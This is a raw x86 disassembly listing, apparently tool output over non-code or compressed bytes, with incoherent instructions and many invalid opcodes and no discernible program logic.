  511411:	dec    ebx
  511412:	nop/reserved BYTE PTR [edi+0x2a31624]
  511419:	mov    bl,0xa4
  51141b:	push   ss
  51141c:	sub    al,0xa4
  51141e:	js     0x5113f1
  511420:	out    dx,al
  511421:	xchg   ebx,ebp
  511423:	loopne 0x5113de
  511425:	call   0xecbf:0x78a57364
  51142c:	add    DWORD PTR [ebx],ebx
  51142e:	stos   BYTE PTR es:[edi],al
  51142f:	pop    eax
  511430:	in     al,dx
  511431:	fistp  WORD PTR [edx]
  511433:	scas   al,BYTE PTR es:[edi]
  511434:	enter  0x194c,0x21
  511438:	lds    edi,FWORD PTR [esi-0x43]
  51143b:	ret    0x338c
  51143e:	jno    0x51148c
  511440:	push   ecx
  511441:	jne    0x511474
  511443:	in     eax,dx
  511444:	movzx  ebp,bh
  511447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  511448:	mov    esp,?
  51144a:	cdq    
  51144b:	cli    
  51144c:	sar    BYTE PTR [esi+0x2f],cl
  51144f:	pop    edx
  511450:	ficomp WORD PTR [esi+eax*2-0x7b]
  511454:	push   0xc0b3c825
  511459:	jg     0x511489
  51145b:	arpl   WORD PTR [edi],di
  51145d:	sbb    al,0xec
  51145f:	aaa    
  511460:	ror    dh,1
  511462:	xor    DWORD PTR [edi+0x32],esp
  511465:	mov    eax,0xd21677f4
  51146a:	or     dl,BYTE PTR [edi+0x22]
  51146d:	int3   
  51146e:	mov    esi,0x6690c5d5
  511473:	jg     0x511494
  511475:	ins    BYTE PTR es:[edi],dx
  511476:	xchg   ebx,eax
  511477:	jge    0x51144b
  511479:	pushf  
  51147a:	repnz test al,0x66
  51147d:	push   ebx
  51147e:	jp     0x511402
  511480:	sti    
  511481:	test   BYTE PTR [eax+0x2d],dl
  511484:	(bad)  
  511485:	mov    ebp,0x222f2525
  51148a:	adc    dh,BYTE PTR [ebp+0xb36f5c6]
  511490:	out    0xd5,eax
  511492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  511493:	mov    WORD PTR [eax-0x1f],?
  511496:	sbb    al,0x3c
  511498:	out    0xee,eax
  51149a:	leave  
  51149b:	inc    ecx
  51149c:	(bad)  
  51149d:	jg     0x51141f
  51149f:	out    0x7d,al
  5114a1:	ja     0x51148e
  5114a3:	adc    BYTE PTR ds:0xa516968f,dh
  5114a9:	or     al,0x89
  5114ab:	jg     0x5114b4
  5114ad:	lds    edi,FWORD PTR [eax+0x6f]
  5114b0:	inc    edi
  5114b1:	aaa    
  5114b2:	test   bl,bh
  5114b4:	je     0x511470
  5114b6:	adc    ecx,ebx
  5114b8:	dec    eax
  5114b9:	pushf  
  5114ba:	aaa    
  5114bb:	bound  ecx,QWORD PTR [ebp+0xa32e6c]
  5114c1:	prefetchnta BYTE PTR [edi+0x28f48715]
  5114c8:	xor    DWORD PTR [esi],edx
  5114ca:	add    DWORD PTR ds:0x1b027b64,esp
  5114d0:	test   DWORD PTR [esi-0x6e],esi
  5114d3:	xchg   edi,esp
  5114d5:	inc    edx
  5114d6:	int3   
  5114d7:	jp     0x51148e
  5114d9:	inc    esp
  5114da:	pop    ebx
  5114db:	in     eax,dx
  5114dc:	stc    
  5114dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5114de:	mov    ch,0xbf
  5114e0:	mov    dl,0xf5
  5114e2:	mov    edi,0x8961d0f
  5114e7:	push   cs
  5114e8:	sub    DWORD PTR [esi+0x1f9fdac9],edi
  5114ee:	jns    0x51156f
  5114f0:	xchg   ecx,eax
  5114f1:	ja     0x511561
  5114f3:	jmp    0x5114a2
  5114f5:	push   edx
  5114f6:	add    eax,0xec68fd94
  5114fb:	sub    BYTE PTR [eax+esi*2],dl
  5114fe:	add    ebp,DWORD PTR [edi+0xd]
  511501:	dec    esi
  511502:	ret    
  511503:	xchg   edi,eax
  511504:	in     al,dx
  511505:	jp     0x5114bd
  511507:	mov    dl,0x29
  511509:	iret   
  51150a:	push   esp
  51150b:	ds push esp
  51150d:	jmp    0x511516
  51150f:	cmp    dh,0xf
  511512:	mov    ds:0x1892ca4,eax
  511517:	(bad)  
  511518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  511519:	push   ebx
  51151a:	xchg   esi,eax
  51151b:	(bad)  
  51151c:	popa   
  51151d:	pop    edi
  51151e:	push   ecx
  51151f:	mov    dh,0xe7
  511521:	xchg   ebp,eax
  511522:	push   ebp
  511523:	stos   DWORD PTR es:[edi],eax
  511524:	lods   al,BYTE PTR ds:[esi]
  511525:	dec    ebx
  511526:	push   edx
  511527:	ds pop ebp
  511529:	rcl    DWORD PTR [esi],1
  51152b:	or     DWORD PTR [edi+0x3ef1649],ebx
  511531:	mov    fs,ebx
  511533:	retf   
  511534:	mov    ebx,0xc98f7356
  511539:	ret    
  51153a:	inc    eax
  51153b:	fistp  QWORD PTR [ebx]
  51153d:	ds (bad) 
  51153f:	and    esp,DWORD PTR [esi+0x33]
  511542:	dec    edi
  511543:	daa    
  511544:	jge    0x511580
  511546:	adc    eax,0xdfcc4ccf
  51154b:	mov    edx,0x3eb31f3c
  511550:	inc    edi
  511551:	fucompp 
  511553:	shl    edi,1
  511555:	es adc ebx,edi
  511558:	and    DWORD PTR [ecx-0x4d],esi
  51155b:	dec    esi
  51155c:	fwait
  51155d:	dec    ebp
  51155e:	imul   edi,esi,0xa
  511561:	call   0x497ab1dc
  511566:	clc    
  511567:	inc    ebp
  511568:	ret    0xc130
  51156b:	inc    ebx
  51156c:	cdq    
  51156d:	mov    al,BYTE PTR [esi]
  51156f:	mov    BYTE PTR [edx],bl
  511571:	or     edi,DWORD PTR [edi+0x1565487d]
  511577:	pop    esi
  511578:	sub    al,BYTE PTR [ecx-0x60]
  51157b:	mov    eax,ds:0x5f34b852
  511580:	pop    ecx
  511581:	popa   
  511582:	ret    0x4ac6
  511585:	loope  0x511574
  511587:	sar    esi,cl
  511589:	stc    
  51158a:	jns    0x511545
  51158c:	outs   dx,DWORD PTR ds:[esi]
  51158d:	and    eax,0xabd564c9
  511592:	loop   0x511556
  511594:	mov    edx,0xc9217bad
  511599:	fsubr  QWORD PTR [edi-0x4cf3b848]
  51159f:	sbb    DWORD PTR [ebp+0x8],0x521f8e78
  5115a6:	mov    BYTE PTR [ecx-0x55],dl
  5115a9:	pop    edi
  5115aa:	jmp    0x9fa8:0x7b250ad0
  5115b1:	pop    ebx
  5115b2:	lds    eax,FWORD PTR [esi-0x1534efd4]
  5115b8:	jle    0x511602
  5115ba:	adc    BYTE PTR [ebp+0x3efb1e32],al
  5115c0:	out    0xf4,al
  5115c2:	or     dh,ah
  5115c4:	mov    ah,0x9b
  5115c6:	imul   ebx,DWORD PTR [edi+eax*1-0x5f],0x75
  5115cb:	xchg   esi,eax
  5115cc:	sub    dh,BYTE PTR [edi]
  5115ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5115cf:	das    
  5115d0:	shl    eax,0x19
  5115d3:	call   FWORD PTR [esp+ecx*4-0x10]
  5115d7:	push   es
  5115d8:	mov    esp,0x2e3955bd
  5115dd:	outs   dx,BYTE PTR ds:[esi]
  5115de:	clc    
  5115df:	popf   
  5115e0:	jl     0x5115de
  5115e2:	scas   al,BYTE PTR es:[edi]
  5115e3:	fsubrp st(6),st
  5115e5:	ins    DWORD PTR es:[edi],dx
  5115e6:	push   esp
  5115e7:	jnp    0x511597
  5115e9:	ins    DWORD PTR es:[edi],dx
  5115ea:	cld    
  5115eb:	jmp    0x598b:0x8d91ee39
  5115f2:	in     eax,dx
  5115f3:	hlt    
  5115f4:	popf   
  5115f5:	inc    ecx
  5115f6:	mov    WORD PTR [esi+edx*2+0x1b],ds
  5115fa:	pop    esi
  5115fb:	push   ds
  5115fc:	jae    0x511598
  5115fe:	or     bh,BYTE PTR ds:0x5b51723d
  511604:	xchg   edx,eax
  511605:	jnp    0x511615
  511607:	jge    0x511671
  511609:	test   eax,0x7439fcf7
  51160e:	imul   esp,DWORD PTR [ecx+0x687aa6a],0xb7f58690
  511618:	in     al,dx
  511619:	fwait
  51161a:	adc    bh,bh
  51161c:	leave  
  51161d:	das    
  51161e:	jmp    FWORD PTR [edi]
  511620:	xchg   edi,eax
  511622:	add    bh,BYTE PTR [edi-0x8]
  511625:	aaa    
  511626:	ret    0xc4b1
  511629:	jno    0x511681
  51162b:	pop    ebp
  51162c:	sbb    bh,dl
  51162e:	fs jge 0x511699
  511631:	dec    ebp
  511632:	jle    0x5115d8
  511634:	cwde   
  511635:	adc    BYTE PTR [esi+0x54],bh
  511638:	int3   
  511639:	xlat   BYTE PTR ds:[ebx]
  51163a:	cmp    al,0xef
  51163c:	xor    eax,0x9b961d52
  511641:	cmc    
  511642:	adc    dh,ah
  511644:	xchg   edi,eax
  511645:	ja     0x5115c7
  511647:	int3   
  511648:	popa   
  511649:	mov    ch,BYTE PTR [edi]
  51164b:	push   0x7927fb0f
  511650:	imul   BYTE PTR [edx+ebx*8+0x7a]
  511654:	lods   al,BYTE PTR es:[esi]
  511656:	test   al,0xac
  511658:	aas    
  511659:	lods   al,BYTE PTR ds:[esi]
  51165a:	dec    ebp
  51165b:	std    
  51165c:	mov    eax,0x259ad1a8
  511661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  511662:	cdq    
  511663:	sub    ebp,esi
  511665:	xchg   esi,eax
  511666:	cmp    ebx,DWORD PTR [edx+0x3]
  511669:	cwde   
  51166a:	adc    ebx,DWORD PTR [ebx-0x7b]
  51166d:	stc    
  51166e:	and    DWORD PTR [edi+0x26322864],edx
  511674:	or     DWORD PTR [eax+0x3dba5f55],esp
  51167a:	xchg   BYTE PTR [edx+0x55dbc83e],al
  511680:	xchg   ecx,eax
  511681:	fisub  DWORD PTR [edx+0x3a5ee645]
  511687:	lds    esp,FWORD PTR [edi]
  511689:	aas    
  51168a:	loope  0x5116c2
  51168c:	dec    edi
  51168d:	mov    ds:0x2c8b50e7,eax
  511692:	and    DWORD PTR [edi-0x23d0bc25],ecx
  511698:	(bad)  
  511699:	in     eax,dx
  51169a:	add    eax,esp
  51169c:	jmp    0xd8b1f38a
  5116a1:	xor    esi,esi
  5116a3:	mov    ah,0xa9
  5116a5:	mov    ch,ch
  5116a7:	and    al,0xb9
  5116a9:	xlat   BYTE PTR ds:[ebx]
  5116aa:	cmp    bh,al
  5116ac:	dec    esi
  5116ad:	stc    
  5116ae:	aad    0x45
  5116b0:	fwait
  5116b1:	pop    DWORD PTR [esi+ebx*2-0x33]
  5116b5:	fidiv  WORD PTR [ecx]
  5116b7:	pop    ss
  5116b8:	inc    ecx
  5116b9:	leave  
  5116ba:	xchg   edi,eax
  5116bb:	aas    
  5116bc:	out    0x8f,al
  5116be:	mov    eax,0xb14408af
  5116c3:	pop    edi
  5116c4:	pop    es
  5116c5:	iret   
  5116c6:	fidiv  WORD PTR [eax+eax*2+0x32]
  5116ca:	mov    ds:0x92b21135,eax
  5116cf:	cmp    DWORD PTR [eax+0x768e7081],edx
  5116d5:	pusha  
  5116d6:	or     BYTE PTR [edi-0x1344201],bh
  5116dc:	jne    0x5116b4
  5116de:	pop    eax
  5116df:	aad    0xee
  5116e1:	mov    ecx,0x48ea3444
  5116e6:	adc    eax,0x1c71ebaf
  5116eb:	inc    eax
  5116ec:	and    ah,BYTE PTR [edi+0x48]
  5116ef:	push   DWORD PTR [ebp-0x4a]
  5116f2:	jge    0x5116e6
  5116f4:	imul   BYTE PTR [eax-0x71]
  5116f7:	mov    ch,0x22
  5116f9:	or     al,0x45
  5116fb:	add    al,0x9e
  5116fd:	dec    edx
  5116fe:	push   ebx
  5116ff:	sub    DWORD PTR [ebx+edx*8-0x68],ebx
  511703:	cmp    DWORD PTR [ebx+0x5b06430f],edi
  511709:	jle    0x511776
  51170b:	sub    ah,BYTE PTR [ecx-0x59]
  51170e:	scas   al,BYTE PTR es:[edi]
  51170f:	retf   
  511710:	out    dx,eax
  511711:	cmp    BYTE PTR [edx-0x96f9d60],ah
  511717:	cld    
  511718:	pop    eax
  511719:	sub    al,0x81
  51171b:	lods   al,BYTE PTR ds:[esi]
  51171c:	cmp    dl,BYTE PTR [eax]
  51171e:	daa    
  51171f:	inc    eax
  511720:	add    BYTE PTR [ecx+0x76],dl
  511723:	(bad)  
  511724:	call   0x8f89:0x8ab89579
  51172b:	sti    
  51172c:	mov    ebp,0x436d8b4c
  511731:	les    esi,FWORD PTR [edx-0x79]
  511734:	push   ebx
  511735:	push   eax
  511736:	mov    esp,DWORD PTR [esi+0x77]
  511739:	xchg   edx,eax
  51173a:	lods   al,BYTE PTR ds:[esi]
  51173b:	sbb    eax,0x62ccd8db
  511740:	inc    ecx
  511741:	arpl   WORD PTR [ebp-0x5d],dx
  511744:	push   ebp
  511745:	call   0x59c9955a
  51174a:	dec    esi
  51174b:	xor    dh,BYTE PTR [ebx+0x12b5359e]
  511751:	sbb    eax,0x4a0687d8
  511756:	out    dx,eax
  511757:	and    eax,0xa31cdf2f
  51175c:	cwde   
  51175d:	and    eax,0xf5f4dd23
  511762:	adc    ebx,ebp
  511764:	and    BYTE PTR [ebx],ch
  511766:	mov    bl,0xb4
  511768:	xchg   BYTE PTR [ecx-0x42],cl
  51176b:	cdq    
  51176c:	cmc    
  51176d:	aad    0x36
  51176f:	add    DWORD PTR [ebp+0x395aa9e0],ebx
  511775:	ret    0x31ea
  511778:	adc    esp,DWORD PTR [edi+0x7800e0de]
  51177e:	jp     0x5117df
  511780:	sub    cl,0x8b
  511783:	dec    eax
  511784:	xchg   ebx,eax
  511785:	out    0x2,eax
  511787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  511788:	loop   0x5117bc
  51178a:	push   ecx
  51178b:	sar    DWORD PTR [ecx-0x17],1
  51178e:	and    cl,BYTE PTR [ecx-0x3]
  511791:	push   ds
  511792:	bnd jb 0x5117c0
  511795:	test   al,0x9b
  511797:	outs   dx,BYTE PTR ds:[esi]
  511798:	cmp    al,0x1
  51179a:	ja     0x5117fb
  51179c:	adc    cl,BYTE PTR [edi-0x5175dbe3]
  5117a2:	(bad)  
  5117a3:	dec    esp
  5117a4:	adc    ebp,DWORD PTR [ebx]
  5117a6:	mov    dh,0xd1
  5117a8:	mov    edi,0xcfcefc23
  5117ad:	cmp    BYTE PTR [ecx-0x6bb8139a],bl
  5117b3:	nop
  5117b4:	or     edi,ecx
  5117b6:	sbb    DWORD PTR [eax],0x5c2c861a
  5117bc:	mov    esi,0xc2371d36
  5117c1:	cmp    al,ah
  5117c3:	sbb    ecx,0x331afc01
  5117c9:	stos   BYTE PTR es:[edi],al
  5117ca:	and    cl,0x25
  5117cd:	dec    eax
  5117ce:	mov    fs,WORD PTR [edi+0x7fa9b0b7]
  5117d4:	jno    0x51179f
  5117d6:	rcl    BYTE PTR [ebx+eax*1-0x469e878b],0x8d
  5117de:	mov    eax,0xf8bc7b5f
  5117e3:	push   cs
  5117e4:	outs   dx,DWORD PTR ds:[esi]
  5117e5:	stos   DWORD PTR es:[edi],eax
  5117e6:	and    ebp,edi
  5117e8:	pop    es
  5117e9:	adc    al,0xe7
  5117eb:	push   esp
  5117ec:	bnd jo 0x5117b6
  5117ef:	inc    ebx
  5117f0:	(bad)  
  5117f1:	call   0x218f572
  5117f6:	mov    WORD PTR [eax+edi*1],?
  5117f9:	sbb    ebx,DWORD PTR [esi+0x13c40a44]
  5117ff:	push   ebp
  511800:	and    dl,BYTE PTR [ecx+0x6a6698bf]
  511806:	pop    edi
  511807:	cmp    eax,DWORD PTR [esi+edx*1+0x6b82fd1d]
  51180e:	cdq    
  51180f:	out    0xa9,eax
  511811:	lods   al,BYTE PTR ds:[esi]
  511812:	xchg   edx,eax
  511813:	loop   0x511867
  511815:	and    DWORD PTR [ecx-0x6b692db8],eax
  51181b:	pop    ecx
  51181c:	or     DWORD PTR [ecx-0x5],esp
  51181f:	jnp    0x5117ec
  511821:	mov    BYTE PTR [ebx-0x4b],ah
  511824:	sub    DWORD PTR [ecx+esi*2+0x16d48b9c],ecx
  51182b:	sub    eax,0x8c51e1d8
  511830:	fs inc ecx
  511832:	add    ecx,DWORD PTR [ecx-0x1181bdd1]
  511838:	rol    BYTE PTR ds:0x6a1a89ee,1
  51183e:	cwde   
  51183f:	subps  xmm2,XMMWORD PTR [eax+0x299df46c]
  511846:	jae    0x511813
  511848:	lds    ebp,FWORD PTR [edi+edx*2-0x74]
  51184c:	jge    0x511893
  51184e:	std    
  51184f:	out    dx,al
  511850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  511851:	jno    0x511803
  511853:	and    dh,dh
  511855:	and    al,BYTE PTR [edi]
  511857:	cmp    DWORD PTR [esi],edx
  511859:	in     al,0x75
  51185b:	push   fs
  51185d:	mov    ds:0x924c405f,al
  511862:	in     al,dx
  511863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  511864:	inc    esp
  511865:	xchg   DWORD PTR [eax-0x60],ebx
  511868:	fimul  WORD PTR [eax]
  51186a:	cdq    
  51186b:	xor    ah,BYTE PTR [eax+ebx*1+0x6d]
  51186f:	dec    esi
  511870:	inc    edi
  511871:	adc    eax,0x81c4b9e7
  511876:	call   0x1bbe:0xa25a5c6e
  51187d:	push   ebx
  51187e:	mov    al,0x46
  511880:	sub    ch,cl
  511882:	repz mov esp,0x867a785c
  511888:	leave  
  511889:	cmp    al,0x99
  51188b:	bnd jbe 0x5118cc
  51188e:	add    eax,0xf9836e5
  511893:	xor    BYTE PTR ds:0x4121ba41,bh
  511899:	fdiv   st(5),st
  51189b:	dec    eax
  51189c:	sti    
  51189d:	mov    bl,0x62
  51189f:	fsubr  DWORD PTR [eax-0xb66ce77]
  5118a5:	jle    0x511877
  5118a7:	int3   
  5118a8:	in     eax,0x38
  5118aa:	loopne 0x511885
  5118ac:	(bad)  
  5118ad:	mov    DWORD PTR ds:0xf3c6db23,edx
  5118b3:	repnz scas al,BYTE PTR es:[edi]
  5118b5:	lods   al,BYTE PTR ds:[esi]
  5118b6:	lds    ebp,FWORD PTR [eax-0x18]
  5118b9:	(bad)  
  5118ba:	xchg   esi,eax
  5118bb:	lea    ebp,[ebp+0x19]
  5118be:	mov    dl,0x49
  5118c0:	inc    eax
  5118c1:	xor    ah,bh
  5118c3:	adc    edx,0x6a
  5118c6:	bound  ecx,QWORD PTR [ecx-0x4a]
  5118c9:	in     al,dx
  5118ca:	jecxz  0x5118ae
  5118cc:	add    BYTE PTR [esi-0x741ecfd1],al
  5118d2:	arpl   WORD PTR ds:0xa1af6dd5,bp
  5118d8:	xor    BYTE PTR [eax+0x244e73b8],0x7b
  5118df:	adc    al,0x13
  5118e1:	sub    al,0x4b
  5118e3:	bound  ebp,QWORD PTR [ecx+edi*2-0x28d086fd]
  5118ea:	mov    esp,0x1d357474
  5118ef:	sbb    dh,dl
  5118f1:	mov    eax,0xc55053e4
  5118f6:	pushf  
  5118f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5118f8:	dec    eax
  5118f9:	push   ebx
  5118fa:	mov    dh,0x9a
  5118fc:	push   esp
  5118fd:	outs   dx,DWORD PTR ds:[esi]
  5118fe:	and    edx,DWORD PTR [ecx+0x78394bd7]
  511904:	outs   dx,DWORD PTR ds:[esi]
  511905:	mov    dh,0x5b
  511907:	fadd   st(0),st
  511909:	push   edi
  51190a:	arpl   WORD PTR [edi+0x51],di
  51190d:	pop    edx
  51190e:	ins    BYTE PTR es:[edi],dx
  51190f:	mov    al,0x59
  511911:	xchg   esi,eax
  511912:	push   cs
  511913:	mov    eax,ds:0xacce5ac4
  511918:	test   al,0xfd
  51191a:	inc    ebp
  51191b:	adc    al,0xf3
  51191d:	cmp    DWORD PTR [eax+0x1c],ebx
  511920:	push   esi
  511921:	mul    BYTE PTR [esi-0x455f4c65]
  511927:	test   DWORD PTR [esp+esi*4+0x12d6b2b1],ebp
  51192e:	data16 clc 
  511930:	jge    0x5118e4
  511932:	(bad)  
  511933:	repnz cmp bh,BYTE PTR [ecx]
  511936:	dec    esp
  511937:	mov    ds:0x4fd88682,al
  51193c:	inc    esi
  51193d:	pop    edi
  51193e:	les    ecx,FWORD PTR [edx+ecx*2]
  511941:	sub    al,0x63
  511943:	pop    esp
  511944:	dec    ebx
  511945:	cmp    ecx,DWORD PTR [edx-0x12]
  511948:	sti    
  511949:	fcom   st(7)
  51194b:	push   ebp
  51194c:	ret    
  51194d:	cs sti 
  51194f:	fs xchg ebx,eax
  511951:	fs enter 0x524e,0x94
  511956:	cld    
  511957:	test   DWORD PTR [edi+0x111b3a8e],esi
  51195d:	pop    edx
  51195e:	stos   DWORD PTR es:[edi],eax
  51195f:	fcomp  st(5)
  511961:	imul   ebp,DWORD PTR [eax-0x6],0xffffff92
  511965:	dec    esp
  511966:	xor    dh,BYTE PTR [ebp+0x27aeee44]
  51196c:	hlt    
  51196d:	jmp    0x5118fd
  51196f:	inc    ebp
  511970:	push   edi
  511971:	sub    al,0x2
  511973:	dec    eax
  511974:	jmp    0xda65:0xa9efcbe9
  51197b:	inc    esi
  51197c:	push   esp
  51197d:	fnsetpm(287 only) 
  51197f:	push   esi
  511980:	lock imul eax,DWORD PTR [eax+0x3],0x7f
  511985:	retf   
  511986:	cmp    DWORD PTR [esi+0x32bdf741],0x83d544b0
  511990:	xor    eax,0x3f1a053a
  511995:	adc    DWORD PTR [esi-0x2b],edx
  511998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  511999:	outs   dx,BYTE PTR ds:[esi]
  51199a:	mov    cl,BYTE PTR ds:0xa660bda8
  5119a0:	push   es
  5119a1:	pop    edi
  5119a2:	dec    ecx
  5119a3:	repnz in al,dx
  5119a5:	test   al,0x78
  5119a7:	sahf   
  5119a8:	retf   
  5119a9:	mov    ecx,DWORD PTR [edi-0x170026fb]
  5119af:	(bad)  
  5119b1:	mov    dh,0x50
  5119b4:	mov    BYTE PTR [ebx],dl
  5119b6:	and    al,BYTE PTR [ebx-0x55b1d15]
  5119bc:	mov    ch,0xa3
  5119be:	pop    esi
  5119bf:	repnz in al,dx
  5119c1:	cmp    eax,DWORD PTR [ebx-0x60b04d12]
  5119c7:	jbe    0x511a30
  5119c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5119ca:	inc    eax
  5119cb:	add    ah,BYTE PTR [edx+0x5fed8a23]
  5119d1:	std    
  5119d2:	pop    edx
  5119d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5119d4:	xor    al,0xc6
  5119d6:	lods   al,BYTE PTR ds:[esi]
  5119d7:	adc    BYTE PTR [ebx+0x79],ch
  5119da:	in     eax,0xa7
  5119dc:	adc    al,0xb
  5119df:	jne    0x51198c
  5119e1:	inc    edx
  5119e2:	mov    esp,0x6ba266a
  5119e7:	lea    eax,[edi-0x144e6f00]
  5119ed:	push   cs
  5119ee:	shl    BYTE PTR [ebx],cl
  5119f0:	adc    ah,ah
  5119f2:	mov    eax,0x1d3ebcf7
  5119f7:	jg     0x511a5f
  5119f9:	outs   dx,BYTE PTR ds:[esi]
  5119fa:	dec    ebp
  5119fb:	sbb    DWORD PTR [edx+0x74cd10ba],esi
  511a01:	jno    0x511a73
  511a03:	push   ds
  511a04:	int    0x13
  511a06:	fs mov dl,0x83
  511a09:	inc    edi
  511a0a:	add    DWORD PTR [esi+eiz*4],edi
  511a0d:	inc    eax
  511a0e:	inc    ebp
  511a0f:	aam    0x31
  511a11:	dec    edx
  511a12:	leave  
  511a13:	mov    ch,BYTE PTR [esp+ebp*4+0x2b215c14]
  511a1a:	cmp    al,ah
  511a1c:	adc    BYTE PTR [edi+ecx*2],dl
  511a1f:	ss dec edx
  511a21:	mov    edi,0x34c275f1
  511a26:	xor    eax,0xc7da0e8f
  511a2b:	(bad)  
  511a2c:	sar    DWORD PTR [ebx-0x1b480b68],cl
  511a32:	faddp  st(0),st
  511a34:	in     eax,0x7a
  511a36:	or     eax,0xa4cb2941
  511a3b:	ficomp WORD PTR [edx-0x8]
  511a3e:	shr    ebx,1
  511a40:	jnp    0x5119e2
  511a42:	push   edi
  511a43:	(bad)  
  511a44:	stc    
  511a45:	or     al,BYTE PTR [ecx+0x42]
  511a48:	hlt    
  511a49:	sbb    al,0x99
  511a4b:	sbb    ecx,eax
  511a4d:	not    ebx
  511a4f:	push   DWORD PTR [ecx-0x72]
  511a52:	adc    dh,ah
  511a54:	adc    al,0x72
  511a56:	sub    esp,DWORD PTR [ecx-0x7a]
  511a59:	mov    BYTE PTR [ebx-0x2d42a959],ah
  511a5f:	xlat   BYTE PTR ds:[ebx]
  511a60:	clc    
  511a61:	cmp    bl,dl
  511a63:	call   0xbc5ca4a3
  511a68:	jge    0x5119f0
  511a6a:	xchg   edx,eax
  511a6b:	test   esp,ebx
  511a6d:	stc    
  511a6e:	xor    BYTE PTR [eax-0xed197f9],bh
  511a74:	add    DWORD PTR [ecx+edi*1-0x3d],0x2a694c4d
  511a7c:	(bad)  
  511a7d:	cwde   
  511a7e:	fidiv  DWORD PTR [esi]
  511a80:	in     eax,dx
  511a81:	inc    ecx
  511a82:	mov    esi,0xc063c9fe
  511a87:	xchg   ebx,eax
  511a88:	adc    DWORD PTR [ebp-0x26],0x17eb0565
  511a8f:	hlt    
  511a90:	and    cl,BYTE PTR [eax+0x71]
  511a93:	rol    al,cl
  511a95:	(bad)  
  511a97:	hlt    
  511a98:	jnp    0x511ada
  511a9a:	cmp    DWORD PTR [edx-0x25],esi
  511a9d:	or     BYTE PTR [edx],ch
  511a9f:	and    DWORD PTR [edx+0x5b612440],ecx
  511aa5:	jnp    0x511a41
  511aa7:	and    BYTE PTR [edx-0x366aed32],dh
  511aad:	cmp    al,0xd3
  511aaf:	xchg   edi,eax
  511ab0:	rcr    DWORD PTR [ebp-0x60762a9a],1
  511ab6:	jb     0x511a5a
  511ab8:	adc    dl,bl
  511aba:	mov    al,ds:0xf96ac2b1
  511abf:	inc    ecx
  511ac0:	lock into 
  511ac2:	sahf   
  511ac3:	mov    esi,DWORD PTR [edi+0x58]
  511ac6:	mov    dh,0x1
  511ac8:	ret    0xb12a
  511acb:	rcl    BYTE PTR [edi-0x43d319b2],cl
  511ad1:	mov    cl,0x80
  511ad3:	lea    edx,[ebp-0x37]
  511ad6:	mov    bh,0xdc
  511ad8:	mov    ebx,0x66fa9f0c
  511add:	cdq    
  511ade:	je     0x511b17
  511ae0:	ror    BYTE PTR ds:0xb0b663f0,cl
  511ae6:	mov    ecx,0x757b6339
  511aeb:	mov    ecx,0xe82a54b5
  511af0:	cmp    BYTE PTR [edi+0x2eeb0e60],dh
  511af6:	repz cmp ecx,edi
  511af9:	sub    DWORD PTR [edx+0x1e],ebp
  511afc:	bound  edx,QWORD PTR [ebx+0x7]
  511aff:	rcr    DWORD PTR [esi],0x49
  511b02:	repz inc ebx
  511b04:	push   ebx
  511b05:	mov    ah,0x2a
  511b07:	movsx  ecx,BYTE PTR ds:0x3154b5fa
  511b0e:	mov    ds:0x90b61e86,eax
  511b13:	jo     0x511a98
  511b15:	aaa    
  511b16:	or     DWORD PTR [ecx+0x2d],esi
  511b19:	call   0x5eb9:0xb7aadafd
  511b20:	push   esi
  511b21:	ss xchg edx,eax
  511b23:	int    0x93
  511b25:	pop    ebp
  511b26:	imul   esi,edx,0x35
  511b29:	xor    BYTE PTR [ebx-0x1a],dl
  511b2c:	dec    esp
  511b2d:	jb     0x511ab0
  511b2f:	test   BYTE PTR [edi-0x4a],dl
  511b32:	je     0x511b57
  511b34:	loop   0x511b48
  511b36:	jns    0x511acf
  511b38:	ror    ecx,cl
  511b3a:	lods   eax,DWORD PTR ds:[esi]
  511b3b:	mov    eax,0xaa8958ef
  511b40:	push   edi
  511b41:	adc    al,0x50
  511b43:	mov    esi,0x5f55a2e7
  511b48:	inc    eax
  511b49:	cmp    al,0x64
  511b4b:	aas    
  511b4c:	add    al,0xc5
  511b4e:	push   edx
  511b4f:	jno    0x511b28
  511b51:	(bad)  
  511b52:	imul   edx
  511b54:	pop    ds
  511b55:	mov    dh,0x8f
  511b57:	inc    edi
  511b58:	test   eax,0x5490a33b
  511b5d:	es push esp
  511b5f:	ins    BYTE PTR es:[edi],dx
  511b60:	ret    0x5772
  511b63:	inc    esi
  511b64:	pop    ds
  511b65:	inc    eax
  511b66:	add    dl,BYTE PTR [esi+0x2a]
  511b69:	and    al,0xb
  511b6b:	into   
  511b6c:	dec    ecx
  511b6d:	xor    BYTE PTR [ecx-0x2e],dh
  511b70:	mov    BYTE PTR [eax],al
  511b72:	fnstcw WORD PTR [ebp+0x31e586a9]
  511b78:	mov    al,0xf2
  511b7a:	(bad)  
  511b7b:	pop    ecx
  511b7c:	sub    al,0x29
  511b7e:	enter  0x39a7,0x5e
  511b82:	push   ebx
  511b83:	push   esi
  511b84:	out    0xc1,eax
  511b86:	bound  eax,QWORD PTR [edx+0x75]
  511b89:	ins    DWORD PTR es:[edi],dx
  511b8a:	jo     0x511b90
  511b8c:	popa   
  511b8d:	inc    ebp
  511b8e:	adc    ecx,ebp
  511b90:	inc    ecx
  511b91:	call   esi
  511b93:	jnp    0x511b20
  511b95:	inc    ecx
  511b96:	idiv   BYTE PTR [ecx+0x1a]
  511b99:	jle    0x511b8a
  511b9b:	out    0xb6,al
  511b9d:	aad    0xa
  511b9f:	lea    ebp,[eax-0x7a272d43]
  511ba5:	xor    edi,DWORD PTR [edx-0x5b33a66f]
  511bab:	(bad)  
  511bac:	cmovs  eax,DWORD PTR [ecx]
  511baf:	dec    edi
  511bb0:	clc    
  511bb1:	rcl    BYTE PTR [eax+0x75],1
  511bb4:	cld    
  511bb5:	repz lahf 
  511bb7:	es cmp al,0x5a
  511bba:	jne    0x511b81
